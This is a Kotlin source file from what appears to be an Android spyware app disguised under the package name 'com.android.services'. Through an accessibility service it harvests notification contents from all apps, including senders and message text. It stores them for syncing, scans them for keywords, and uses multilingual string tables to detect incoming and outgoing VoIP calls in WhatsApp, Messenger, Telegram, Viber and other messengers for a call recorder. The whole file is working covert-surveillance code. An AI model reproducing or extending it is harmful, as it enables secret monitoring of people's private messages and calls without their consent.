package com.android.services.accessibility.data

import android.app.Notification
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.os.Parcelable
import android.text.SpannableString
import android.text.TextUtils
import android.util.ArrayMap
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.db.entities.AppNotifications
import com.android.services.db.entities.TextAlert
import com.android.services.enums.IMType
import com.android.services.enums.TextAlertCategory
import com.android.services.interfaces.OnAccessibilityEvent
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.AccessibilityEventModel
import com.android.services.models.NotificationAlert
import com.android.services.util.*
import com.android.services.workers.SmsWorker
import org.greenrobot.eventbus.EventBus
import java.net.URLEncoder
import java.util.*

class NotificationStateChangedData(private val localDatabaseSource: LocalDatabaseSource) :
    OnAccessibilityEvent {

    companion object {
        var voipCallIdentifiers = ArrayMap<String, List<String>>()

        /**
         * VOiP Call Recorder Languages
         * English, Arabic, France, Italic, Portugues Portugal,Portuguess Brasil,Espanol Espana,Espanol Estados Unidos,Turkce Turkiye,PyccKNN Poccnr ( Russian ),Persian Irani,Chinese,
         * Deutsch Deutschland,Deutsch Osterreich,Deutsch Schweiz
         */
        init {

            //Facebook
            voipCallIdentifiers["com.facebook.orca_incoming"] =
                ArrayList(
                    listOf(
                        "calling from",
                        "video chatting",
                        "اتصال من",
                        "دردشة فيديو من",
                        "Appel de",
                        "开始聊天",
                        "轻触返回通话• 正在呼叫",
                        "Discussion vidéo de",
                        "Chiamata da Messenger”,”Videochiamata da Messenger",
                        "Chiamata da Messenger",
                        "Videochiamata da Messenger",
                        "A ligar de Messenger",
                        "Conversa de vídeo de Messenger",
                        "Ligando de Messenger",
                        "Conversando por vídeo pelo Messenger",
                        "Llamada de Messenger",
                        "Chat de vídeo de Messenger",
                        "Llamada de Messenger",
                        "Videochat de Messenger",
                        "Messenger'dan arıyor",
                        "Messenger'dan görüntülü sohbet",
                        "Вызов из приложения Messenger",
                        "Видеочат в приложении Messenger",
                        "Calling from Messenger",
                        "Video chatting from Messenger",
                        "Anruf über Messenger",
                        "Videochat von Messenger"
                    )
                )
            voipCallIdentifiers["com.facebook.orca_outgoing"] = ArrayList(
                listOf(
                    "tap to return",
                    "正在通过Messenger呼叫",
                    "正在通过Messenger呼叫",
                    "contacting",
                    "اضغط للعودة إلى المكالمة",
                    "ضغط للعودة إلى المكالمة",
                    "Appuyez pour revenir à l’appel • Appel en cours",
                    "Tocca per tornare alla chiamata • Chiamata in corso",
                    "Tocca per tornare alla chiamata • Chiamata in corso",
                    "Toca para voltares à chamada • A ligar",
                    "Toque para retornar à ligação • Ligando",
                    "Toca para volver a la llamada • Llamando",
                    "Toca para volver a la llamada • Llamando",
                    "Aramaya dönmek için dokun • Aranıyor",
                    "Коснитесь, чтобы вернуться к вызову • Выполняется вызов",
                    "Tap to return to call • Calling",
                    "Tippen, um zum Anruf zurückzukehren • Wird angerufen",
                    "Tippen, um zum Anruf zurückzukehren • Wird angerufen"
                )
            )

            //WhatsApp
            voipCallIdentifiers["com.whatsapp_incoming"] = ArrayList(
                listOf(
                    "incoming",
                    "مكالمة فيديو واردة",
                    "اضغط للعودة إلى المكالمة",
                    "Appel vidéo entrant",
                    "视频通话来电",
                    "语音通话来电",
                    "Appel vocal entrant",
                    "Chiamata vocale in arrivo”,”Videochiamata in arrivo",
                    "Chiamata vocale in arrivo",
                    "Videochiamata in arrivo",
                    "Recebida (voz)",
                    "A receber videochamada",
                    "Chamada de voz recebida",
                    "Chamada de vídeo recebida",
                    "Llamada entrante",
                    "Videollamada entrante",
                    "Llamada entrante",
                    "Videollamada entrante",
                    "Gelen sesli arama",
                    "Gelen görüntülü arama",
                    "Входящий аудиозвонок",
                    "Входящий видеозвонок",
                    "تماس تصویری ورودی",
                    "تماس صوتی ورودی",
                    "Eingehender Sprachanruf",
                    "Eingehender Videoanruf"
                )
            )
            voipCallIdentifiers["com.whatsapp_outgoing"] = ArrayList(
                listOf(
                    "calling",
                    "جارِ الاتصال",
                    "Appel en cours",
                    "Chiamata in corso",
                    "正在呼叫",
                    "正在呼叫",
                    "Chiamata in corso",
                    "A ligar",
                    "Ligando",
                    "Llamando",
                    "Llamando",
                    "Aranıyor",
                    "Звонок",
                    "در حال تماس",
                    "Anrufen"
                )
            )

            // Line
            voipCallIdentifiers["jp.naver.line.android_incoming"] =
                ArrayList(
                    listOf(
                        "incoming",
                        "صوتية واردة",
                        "فيديو واردة",
                        "LINE语音通话来电",
                        "LINE语音通话来电",
                        "Appel vocal LINE entrant",
                        "Appel vocal LINE entrant",
                        "Chiamata vocale LINE in arrivo",
                        "Videochiamata LINE in arrivo",
                        "chamada de voz line recebida",
                        "chamada de vídeo line recebida",
                        "recebendo chamada de voz line",
                        "recebendo chamada de vídeo line",
                        "te está llamando",
                        "quiere verte",
                        "te está llamando",
                        "te quiere ver",
                        "gelen lıne sesli araması",
                        "gelen lıne görüntülü araması",
                        "входящий звонок line",
                        "входящий видеозвонок line",
                        "incoming line voice call",
                        "incoming line video call",
                        "line语音通话来电",
                        "line视频通话来电",
                        "eingehender line-sprachanruf",
                        "eingehender line-videoanruf"
                    )
                )
            voipCallIdentifiers["jp.naver.line.android_outgoing"] =
                ArrayList(
                    listOf(
                        "making",
                        "إجراء مكالمة",
                        "正在拨打LINE语音通话",
                        " 正在拨打LINE视频通话",
                        "Appel vocal LINE en cours",
                        "Appel vidéo LINE en cours",
                        "Chiamata vocale LINE in corso”,”Videochiamata LINE in corso",
                        "Chiamata vocale LINE in corso",
                        "Videochiamata LINE in corso",
                        "a fazer uma chamada de voz line",
                        "a fazer uma chamada de vídeo line",
                        "fazendo uma chamada de voz line",
                        "fazendo uma chamada de vídeo line",
                        "llamando con line",
                        "haciendo videollamada",
                        "llamando con line",
                        "haciendo videollamada",
                        "lıne sesli araması yapılıyor",
                        "lıne görüntülü araması yapılıyor",
                        "начало звонка через line",
                        "начало видеозвонка через line",
                        "making a line voice call",
                        "making a line video call",
                        "line-sprachanruf wird getätigt",
                        "line-videoanruf wird getätigt"
                    )
                )

            //Viber
            voipCallIdentifiers["com.viber.voip_incoming"] = ArrayList(
                listOf(
                    "incoming viber",
                    "مكالمة فايبر واردة",
                    "مكالمة فيديو واردة من فايبر",
                    "در حال اتصال مجدد",
                    "Gelen Viber araması",
                    "Gelen Viber görüntülü araması",
                    "Appel entrant Viber",
                    "Llamada entrante de Viber",
                    "Llamada de vídeo entrante de Viber",
                    "Chamada Viber recebida",
                    "Llamada de vídeo entrante de Viber",
                    "Llamada entrante de Viber",
                    "Chamada de vídeo Viber recebida",
                    "Viber 来电",
                    "Viber 视频来电",
                    "Appel vidéo Viber entrant",
                    "Chiamata Viber in entrata”,”Videochiamata Viber in entrata",
                    "Chiamata Viber in entrata",
                    "Videochiamata Viber in entrata",
                    "Chamada do Viber recebida",
                    "Chamada de vídeo do Viber recebida",
                    "---",
                    "---",
                    "---",
                    "----",
                    "---",
                    "----",
                    "---",
                    "----",
                    "Входящий вызов Viber",
                    "Входящий видеозвонок Viber",
                    "تماس ویدیویی ورودی در وایبر",
                    "تماس ورودی وایبر",
                    "Eingehender Viber-Anruf",
                    "Eingehender Viber-Videoanruf"
                )
            )
            voipCallIdentifiers["com.viber.voip_outgoing"] = ArrayList(
                listOf(
                    "outgoing viber",
                    "مكالمة فايبر صادرة",
                    "Appel sortant Viber",
                    "Chiamata Viber in uscita",
                    "Viber 已拨电话",
                    "Viber 已拨电话",
                    "Chiamata Viber in uscita",
                    "Chamada Viber efetuada",
                    "Chamada Viber originada",
                    "Llamada saliente de Viber",
                    "Llamada saliente de Viber",
                    "Giden Viber araması",
                    "Исходящий вызов Viber",
                    "تماس خروجی وایبر",
                    "Ausgehender Viber-Anruf"
                )
            )

            //Imo
            voipCallIdentifiers["com.imo.android.imoim_incoming"] = ArrayList(
                listOf(
                    "incoming imo",
                    "مكالمة صوتية واردة",
                    "مكالمة فيديو واردة",
                    "音频imo通话来电",
                    "视频imo通话来电",
                    "----",
                    "----",
                    "---",
                    "----",
                    "----",
                    "----",
                    "---",
                    "----",
                    "входящий imo аудиовызов",
                    "входящий imo видеовызов",
                    "incoming imo audio call",
                    "incoming imo video call",
                    "incoming imo audio call",
                    "incoming imo video call"
                )
            )
            voipCallIdentifiers["com.imo.android.imoim_outgoing"] = ArrayList(
                listOf(
                    "ongoing imo",
                    "مكالمة imo جارية",
                    "مكالمة فيديو جارية على",
                    "Appel imo en cours",
                    "进行中的imo通话",
                    "进行中的imo视频通话",
                    "Appel vidéo imo en cours",
                    "Chiamata imo in corso”,Video-chiamata imo in corso",
                    "Chiamata imo in corso",
                    "Video-chiamata imo in corso",
                    "Chamada imo em curso",
                    "Chamada de vídeo imo a decorrer",
                    "Chamada imo em curso",
                    "Chamada de vídeo imo em curso",
                    "Llamada imo en curso",
                    "Videollamada imo en curso",
                    "Llamada imo en curso",
                    "Video llamada imo en curso",
                    "текущий вызов imo",
                    "текущий видеовызов imo",
                    "تماس تصویری imo در جریان",
                    "تماس imo در جریان",
                    "aktueller imo-anruf",
                    "aktueller imo-videoanruf",
                    "Devam eden imo çağrısı",
                    "Devam eden imo görüntülü çağrısı"
                )
            )

            // Google Hangouts
            voipCallIdentifiers["com.google.android.talk_incoming"] =
                ArrayList(
                    listOf(
                        "incoming",
                        "مكالمة صوتية واردة",
                        "مكالمة فيديو واردة",
                        "Appel audio entrant",
                        "接到视频通话邀请",
                        "接到语音来电",
                        "Appel audio entrant",
                        "chiamata vocale in arrivo",
                        "videochiamata in arrivo",
                        "A receber uma chamada de voz",
                        "A receber uma videochamada",
                        "Recebendo chamada de voz",
                        "Recebendo videochamada",
                        "Llamada de voz entrante",
                        "Videollamada entrante",
                        "Llamada de voz entrante",
                        "Videollamada entrante",
                        "Gelen sesli arama isteği",
                        "Gelen video görüşmesi isteği",
                        "Входящий голосовой вызов",
                        "Входящий видеовызов",
                        "تماس صوتی ورودی",
                        "تماس تصویری ورودی",
                        "Eingehender Audioanruf",
                        "Eingehender Videoanruf"
                    )
                )
            voipCallIdentifiers["com.google.android.talk_outgoing"] = ArrayList(
                listOf(
                    "ongoing",
                    "مكالمة فيديو مستمرة",
                    "مكالمة صوتية جارية",
                    "Appuyez pour revenir à l'appel",
                    "点按即可返回通话",
                    "点按即可返回通话",
                    "chiamata vocale in corso",
                    "videochiamata in corso",
                    "Chamada de voz em curso",
                    "Videochamada em curso",
                    "Chamada de voz em andamento",
                    "Videochamada em andamento",
                    "Llamada de voz en curso",
                    "Videollamada en curso",
                    "Llamada de voz en curso",
                    "Videollamada en curso",
                    "Devam eden sesli arama",
                    "Devam eden video görüşmesi",
                    "Идет голосовой вызов",
                    "Идет видеовстреча",
                    "تماس صوتی درحال انجام",
                    "تماس تصویری درحال انجام",
                    "Aktueller Audioanruf",
                    "Aktueller Videoanruf"
                )
            )

            // Telegram
            voipCallIdentifiers["org.telegram.messenger_incoming"] =
                ArrayList(
                    listOf(
                        "telegram call",
                        "مكالمة تيليجرام",
                        "Appel Telegram",
                        "Appel vidéo Telegram",
                        "Chiamata Telegram",
                        "Videochiamata Telegram",
                        "Chamada via Telegram",
                        "Videochamada via Telegram",
                        "Llamada de Telegram",
                        "Videollamada de Telegram",
                        "Llamada de Telegram",
                        "Videollamada de Telegram",
                        "Telegram Araması",
                        "Telegram Görüntülü Araması",
                        "Звонок Telegram",
                        "Видеозвонок через Telegram",
                        "تماس تلگرامی",
                        "تماس ویدیویی تلگرامی",
                        "Telegram-Anruf",
                        "Laufender Telegram-Anruf"
                    )
                )
            voipCallIdentifiers["org.telegram.messenger_outgoing"] = ArrayList(
                listOf(
                    "ongoing telegram",
                    "مكالمة تيليجرام الحالية",
                    "Appel Telegram en cours",
                    "Appel vidéo manqué",
                    "Chiamata Telegram in corso",
                    "Chamada via Telegram em andamento",
                    "Chamada via Telegram em andamento",
                    "Llamada de Telegram en curso",
                    "Llamada de Telegram en curso",
                    "Llamada de Telegram en curso",
                    "Devam eden Telegram araması",
                    "Текущий звонок Telegram",
                    "تماس تلگرامی در حال انجام",
                    "Laufender Telegram-Anruf",
                    "Laufender Telegram-Anruf"
                )
            )

            //Hike Messenger
            voipCallIdentifiers["com.hike.chat.stickers_incoming"] = ArrayList(
                listOf(
                    "incoming",
                    "hike call"
                )
            )
            voipCallIdentifiers["com.hike.chat.stickers_outgoing"] = ArrayList(
                listOf(
                    "outgoing",
                    "hike call"
                )
            )
        }

        /**
         * Inserts the app notification into database
         * @param localDatabaseSource LocalDatabaseSource
         * @param packageName packageName
         * @param notificationSender Sender of Notification
         * @param notificationContent Notification Content
         * @param notificationTime Time Of Notification
         */
        fun insertAppNotification(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
            packageName: String,
            notificationSender: String,
            notificationContent: String,
            notificationTime: String = "",
        ) {
            val appNotifications = AppNotifications()
            val uniqueId =
                AppUtils.md5Hash(packageName + notificationSender + notificationContent + notificationTime)
            if (localDatabaseSource.checkAppNotificationNotAlreadyExists(uniqueId) && AppConstants.syncAppNotifications) {
                logVerbose("saving the notification with $uniqueId, $packageName, $notificationSender, $notificationContent")
                appNotifications.apply {
                    this.uniqueId = uniqueId
                    this.packageName = packageName
                    this.appName = AppUtils.getAppNameFromPackage(packageName)
                    this.title = notificationSender
                    this.text = notificationContent
                    this.dateTime = if (notificationTime.isEmpty()) AppUtils.formatDate(
                        System.currentTimeMillis().toString()
                    ) else
                        AppUtils.formatDate(notificationTime)
                    this.date =
                        if (notificationTime.isEmpty()) AppUtils.getDate(System.currentTimeMillis())
                        else AppUtils.getDate(notificationTime.toLong())
                    this.status = 0
                }
                localDatabaseSource.insertAppNotifications(appNotifications)
                logVerbose("notification saved $appNotifications")
                runNotificationAlertTask(context, appNotifications)
                EventBus.getDefault().post("syncTextAlerts")
                // run sms alert task
                if (appNotifications.packageName == AppUtils.getDefaultMessagingApp()) {
                    SmsUtil.runSmsTextAlertTask(context, appNotifications = appNotifications)
                }

            } else {
                logVerbose("notification id already exists $uniqueId")
            }
        }

        private fun runNotificationAlertTask(context: Context, appNotifications: AppNotifications) {
            // perform text alert task
            val textAlertRepository =
                InjectorUtils.provideTextAlertRepository(context)
            textAlertRepository.selectTextAlerts { textAlerts ->
                if (textAlerts.isNotEmpty()) {
                    val notificationAlerts =
                        textAlerts.filter { it.category == TextAlertCategory.notifications.toString() }
                    if (notificationAlerts.isNotEmpty()) {
                        executeNotificationAlertTask(
                            context,
                            appNotifications,
                            notificationAlerts
                        )
                    } else {
                        logVerbose("${SmsWorker.TAG} sms alerts are empty")
                    }
                }
            }
        }

        private fun executeNotificationAlertTask(
            applicationContext: Context,
            appNotifications: AppNotifications,
            notificationAlerts: List<TextAlert>,
        ) {
            notificationAlerts.forEach { notificationAlert ->
                if (notificationAlert.type == "keyword") {
                    if (appNotifications.text.lowercase()
                            .contains(notificationAlert.keyword.lowercase())
                    ) {
                        logVerbose("${SmsWorker.TAG} its an sms alert for keyword ${notificationAlert.keyword}")
                        addTextAlertEvent(applicationContext, appNotifications, notificationAlert)
                    }
                }
            }
        }

        private fun addTextAlertEvent(
            applicationContext: Context,
            appNotifications: AppNotifications,
            textAlert: TextAlert,
        ) {
            val notificationAlert = NotificationAlert()
            notificationAlert.also {
                it.packageName = appNotifications.packageName
                it.appName = appNotifications.appName
                it.body = appNotifications.text
                it.title = appNotifications.title
                it.date = appNotifications.dateTime
            }
            RoomDBUtils.addTextAlertEvent(
                applicationContext,
                textAlert,
                notificationAlert = notificationAlert
            )
        }
    }


    override fun onAccessibilityEvent(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel,
    ) {
        try {
            val packageName = accessibilityEventModel.packageName
            val eventClassName = accessibilityEventModel.eventClassName
            val eventText = accessibilityEventModel.eventText
            val data = accessibilityEventModel.parcelable

            if (data is Notification) {
                val tickerText = data.tickerText ?: ""
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Notify Ticker Text: $tickerText")
                val extras = data.extras
                val extraTitle = extras.getString(Notification.EXTRA_TITLE) ?: ""

                var extraText = if (extras.get(Notification.EXTRA_TEXT) is SpannableString) {
                    val extraSpannableText = extras.get(Notification.EXTRA_TEXT) as SpannableString?
                    extraSpannableText?.toString() ?: ""
                } else {
                    extras.get(Notification.EXTRA_TEXT).toString()
                }

                var extraBigText = ""
                if (AppConstants.osGreaterThanOrEqualLollipop) {
                    val chars = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)
                    if (chars != null && !TextUtils.isEmpty(chars)) {
                        extraBigText = chars.toString()
                    }
                }
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Notify Extra Title: $extraTitle")
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Notify Extra Text: $extraText")
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Notify Extra BigText: $extraBigText")

                var messages: Array<Parcelable>? = emptyArray()
                if (AppConstants.osGreaterThanEqualToNougat) {
                    messages = extras.get(Notification.EXTRA_MESSAGES) as Array<Parcelable>?
                }
                val extraLines: Array<CharSequence>? =
                    extras.get(Notification.EXTRA_TEXT_LINES) as Array<CharSequence>?
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Notify Extra Messages: $messages")
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Notify Extra Lines: $extraLines")

                if (messages.isNullOrEmpty() && extraLines == null) {
                    // Insert AppNotification
                    if (extraText.isNotEmpty() && extraTitle.isNotEmpty()) {
                        insertAppNotification(
                            context,
                            localDatabaseSource,
                            packageName = packageName,
                            notificationSender = extraTitle,
                            notificationContent = if (extraBigText.isNotEmpty()) extraBigText else extraText,
                            ""
                        )
                    }
                } else {

                    if (!messages.isNullOrEmpty()) {
                        messages.forEach { it ->
                            val bundle = it as Bundle
                            val bundleText = bundle.get("text")
                            val notificationContent = if (bundleText is SpannableString) {
                                val extraSpannableText = bundleText as SpannableString?
                                extraSpannableText?.toString() ?: ""
                            } else {
                                bundleText.toString()
                            }

                            val notificationTime = bundle.get("time") as Long
                            val notificationSender = bundle.get("sender") as String
                            insertAppNotification(
                                context,
                                localDatabaseSource,
                                packageName = packageName,
                                notificationSender = notificationSender,
                                notificationContent = notificationContent,
                                notificationTime = notificationTime.toString()
                            )
                        }
                    } else extraLines?.forEach { line ->
                        insertAppNotification(
                            context,
                            localDatabaseSource,
                            packageName = packageName,
                            notificationSender = extraTitle,
                            notificationContent = line.toString() ?: ""
                        )
                    }
                }

                AppUtils.appendLog(
                    context,
                    String.format(
                        "%s%s%s%s%s",
                        "\n\n\n$packageName ",
                        "$extraTitle , ",
                        "$extraText , ",
                        "$extraBigText , ",
                        AppUtils.getDate(System.currentTimeMillis())
                    )
                )

                logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                    String.format(
                        "%s%s%s%s%s",
                        "package Name = $packageName ",
                        "extra Title = $extraTitle , ",
                        "extra Text = $extraText , ",
                        "extraBigText = $extraBigText , ",
                        AppUtils.getDate(System.currentTimeMillis())
                    )
                }")

                if (packageName == "com.facebook.orca" && AppUtils.isVOIPCallEnabled(IMType.Facebook.toString())) {
                    if (extraText.isNotEmpty()) {
                        val callDirection = detectVoipCallDirection(
                            packageName,
                            extraText,
                            extraTitle,
                            extraBigText
                        )
                        AppUtils.appendLog(
                            context,
                            String.format("%s", "Call Direction = $callDirection")
                        )
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                            String.format("%s", "Call Direction = $callDirection")
                        }")
                        if (callDirection == "incoming") {
                            setVoipCallParam(extraTitle,
                                "incoming",
                                IMType.Facebook.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (callDirection == "outgoing") {
                            setVoipCallParam(extraTitle,
                                "outgoing",
                                IMType.Facebook.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        }
                    }
                } else if ((packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") && AppUtils.isVOIPCallEnabled(
                        IMType.WhatsApp.toString()
                    )
                ) {
                    if (extraText.isNotEmpty()) {
                        val callDirection = detectVoipCallDirection(
                            packageName,
                            extraText,
                            extraTitle,
                            extraBigText
                        )
                        AppUtils.appendLog(
                            context,
                            String.format("%s", "Call Direction = $callDirection")
                        )
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                            String.format("%s", "Call Direction = $callDirection")
                        }")
                        if (callDirection == "incoming") {
                            setVoipCallParam(extraTitle,
                                "incoming",
                                IMType.WhatsApp.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (callDirection == "outgoing") {
                            setVoipCallParam(extraTitle,
                                "outgoing",
                                IMType.WhatsApp.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        }
                    }
                } else if (packageName == "jp.naver.line.android" && AppUtils.isVOIPCallEnabled(
                        IMType.Line.toString()
                    )
                ) {
                    if (eventText.contains(":")) {
                        val arr = eventText.split(":").toTypedArray()
                        var name = arr[0]
                        val callText = arr[1]
                        name = name.replace("[", "")
                        name = name.replace("]", "")
                        val callDirection =
                            detectVoipCallDirection(packageName, callText, extraTitle, extraBigText)
                        AppUtils.appendLog(
                            context,
                            String.format("%s", "Call Direction = $callDirection")
                        )
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                            String.format("%s", "Call Direction = $callDirection")
                        }")
                        if (callDirection == "incoming") {
                            setVoipCallParam(name,
                                "incoming",
                                IMType.Line.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (callDirection == "outgoing") {
                            setVoipCallParam(name,
                                "outgoing",
                                IMType.Line.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        }
                    }
                } else if (packageName == "com.viber.voip" && AppUtils.isVOIPCallEnabled(
                        IMType.Viber.toString()
                    )
                ) {
                    val callDirection =
                        detectVoipCallDirection(packageName, extraBigText, extraTitle, extraBigText)
                    AppUtils.appendLog(
                        context,
                        String.format("%s", "Call Direction = $callDirection")
                    )
                    logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                        String.format("%s", "Call Direction = $callDirection")
                    }")
                    if (callDirection == "incoming") {
                        setVoipCallParam(extraTitle,
                            "incoming",
                            IMType.Viber.toString(),
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                            "")
                    } else if (callDirection == "outgoing") {
                        setVoipCallParam(extraTitle,
                            "outgoing",
                            IMType.Viber.toString(),
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                            "")
                    }
                } else if (packageName == "com.imo.android.imoim" && AppUtils.isVOIPCallEnabled(
                        IMType.Imo.toString()
                    )
                ) {
                    if (extraText.isNotEmpty()) extraText = extraText.replace("with ", "")
                    if (extraTitle.isNotEmpty()) {
                        val callDirection = detectVoipCallDirection(
                            packageName,
                            extraTitle,
                            extraTitle,
                            extraBigText
                        )
                        AppUtils.appendLog(
                            context,
                            String.format("%s", "Call Direction = $callDirection")
                        )
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                            String.format("%s", "Call Direction = $callDirection")
                        }")
                        if (callDirection == "incoming") {
                            setVoipCallParam(extraText,
                                "incoming",
                                IMType.Imo.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (callDirection == "outgoing") {
                            setVoipCallParam(extraText,
                                "outgoing",
                                IMType.Imo.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        }
                    }
                } else if (packageName == "com.google.android.talk" && AppUtils.isVOIPCallEnabled(
                        IMType.Hangouts.toString()
                    )
                ) {
                    if (extraText.isNotEmpty() && extraTitle.isNotEmpty()) {
                        val callDirection = detectVoipCallDirection(
                            packageName,
                            extraText,
                            extraTitle,
                            extraBigText
                        )
                        AppUtils.appendLog(
                            context,
                            String.format("%s", "Call Direction = $callDirection")
                        )
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                            String.format("%s", "Call Direction = $callDirection")
                        }")
                        if (callDirection == "incoming") {
                            setVoipCallParam(
                                AccessibilityUtils.hangOutConversationName,
                                "incoming",
                                IMType.Hangouts.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "" else "",
                                ""
                            )
                        } else if (callDirection == "outgoing") {
                            setVoipCallParam(
                                AccessibilityUtils.hangOutConversationName,
                                "outgoing",
                                IMType.Hangouts.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                ""
                            )
                        }
                    }
                } else if (packageName == "org.telegram.messenger" && AppUtils.isVOIPCallEnabled(
                        IMType.Telegram.toString()
                    )
                ) {
                    if (extraText.isNotEmpty() && extraTitle.isNotEmpty()) {
                        val callDirection = detectVoipCallDirection(
                            packageName,
                            extraTitle,
                            extraTitle,
                            extraBigText
                        )
                        AppUtils.appendLog(
                            context,
                            String.format("%s", "Call Direction = $callDirection")
                        )
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} ${
                            String.format("%s", "Call Direction = $callDirection")
                        }")
                        if (callDirection == "incoming") {
                            setVoipCallParam(extraText,
                                "incoming",
                                IMType.Telegram.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (callDirection == "outgoing") {
                            setVoipCallParam(extraText,
                                "outgoing",
                                IMType.Telegram.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        }
                    }
                } else if (packageName == "com.hike.chat.stickers" && !AccessibilityUtils.isIncomingVoipCaptured && !AccessibilityUtils.isOutgoingVoipCaptured
                    && AppUtils.isVOIPCallEnabled(IMType.Hike.toString())
                ) {
                    if (extraText.isNotEmpty() && extraTitle.isNotEmpty()) {
                        extraText = extraText.lowercase(Locale.getDefault())
                        val title = extraTitle.lowercase(Locale.getDefault())
                        if (extraText.contains("incoming") && title.contains("hike call")) {
                            val arr = extraTitle.split(" ").toTypedArray()
                            val chatName = arr[arr.size - 1]
                            setVoipCallParam(chatName,
                                "incoming",
                                IMType.Hike.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (extraText.contains("outgoing") && title.contains("hike call")) {
                            val arr = extraTitle.split(" ").toTypedArray()
                            val chatName = arr[arr.size - 1]
                            setVoipCallParam(chatName,
                                "outgoing",
                                IMType.Hike.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                "")
                        } else if (title.contains("hike call")) {
                            setVoipCallParam(
                                AccessibilityUtils.imContactName,
                                "outgoing",
                                IMType.Hike.toString(),
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) data.channelId else "",
                                ""
                            )
                        }
                    }
                } else if (!AccessibilityUtils.isVOIPModeRinging(context) && !AccessibilityUtils.isVOIPModeActive(
                        context)
                ) {
                    logVerbose("${AppConstants.VOIP_CALL_TYPE} voipMode is Disabled resetting Voip Params")
                    AppUtils.appendLog(context,
                        "${AppConstants.VOIP_CALL_TYPE} voipMode is Disabled resetting Voip Params")
                    AccessibilityUtils.voipName = ""
                    AccessibilityUtils.voipNumber = ""
                    AccessibilityUtils.voipDirection = ""
                    AccessibilityUtils.voipMessenger = ""
                    AccessibilityUtils.voipType = ""
                    AccessibilityUtils.voipStartTime = 0L
                    AccessibilityUtils.notificationChannelId = ""
                    AccessibilityUtils.isOutgoingVoipCaptured = false
                    AccessibilityUtils.isIncomingVoipCaptured = false
                }
            }
        } catch (e: Exception) {
            logVerbose("OnNotificationChangedError: %s", e.message)
            AppUtils.appendLog(context, "Notification state change exception = ${e.message}")
        }
    }

    private fun detectVoipCallDirection(
        packageName: String,
        extraText: String,
        extraTitle: String?,
        extraBigText: String,
    ): String {
        val lowerCaseText = extraText.lowercase(Locale.getDefault())
        val lowerCaseTitle = extraTitle!!.lowercase(Locale.getDefault())
        val lowerCaseBigText = extraBigText.lowercase(Locale.getDefault())
        val outgoingCallIdentifiers = voipCallIdentifiers[packageName + "_" + "outgoing"]!!
        for (outgoingIdentifier in outgoingCallIdentifiers) {
            if (extraText.contains(outgoingIdentifier) || lowerCaseText.contains(outgoingIdentifier)) {
                return "outgoing"
            }
            if (packageName == "com.google.android.talk") {
                if (extraTitle.contains(outgoingIdentifier) || lowerCaseTitle.contains(
                        outgoingIdentifier
                    )
                ) {
                    return "outgoing"
                }
            }
        }
        val incomingCallIdentifiers = voipCallIdentifiers[packageName + "_" + "incoming"]!!
        for (incomingIdentifier in incomingCallIdentifiers) {
            if (extraText.contains(incomingIdentifier) || lowerCaseText.contains(incomingIdentifier)) {
                return "incoming"
            }
        }
        return ""
    }

    private fun setVoipCallParam(
        extraTitle: String?,
        direction: String,
        messenger: String,
        channelId: String,
        number: String,
    ) {
        AccessibilityUtils.voipName = extraTitle ?: ""
        AccessibilityUtils.voipDirection = direction
        AccessibilityUtils.voipMessenger = messenger
        AccessibilityUtils.voipStartTime = System.currentTimeMillis()
        AccessibilityUtils.notificationChannelId = channelId
        AccessibilityUtils.voipNumber = ""
        if (direction == "incoming") AccessibilityUtils.isIncomingVoipCaptured =
            true else AccessibilityUtils.isOutgoingVoipCaptured = true
    }
}